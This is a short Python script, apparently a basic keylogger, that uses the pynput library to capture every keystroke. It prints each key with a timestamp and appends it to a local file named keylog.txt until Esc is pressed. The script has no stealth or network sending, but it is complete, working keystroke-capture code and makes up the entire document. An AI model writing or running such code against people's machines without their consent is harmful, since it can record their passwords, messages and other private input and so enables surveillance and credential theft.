from pynput import keyboard
import time

def on_press(key):
    try:
        char = key.char
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        print(f"{timestamp} - Key pressed: {char}")
        with open("keylog.txt", "a") as f:
            f.write(f"{timestamp} - {char}\n")
    except AttributeError:
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.tab:
            char = "\t"
        else:
            char = str(key)
        print(f"{timestamp} - Key pressed: {char}")
        with open("keylog.txt", "a") as f:
            f.write(f"{timestamp} - {char}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
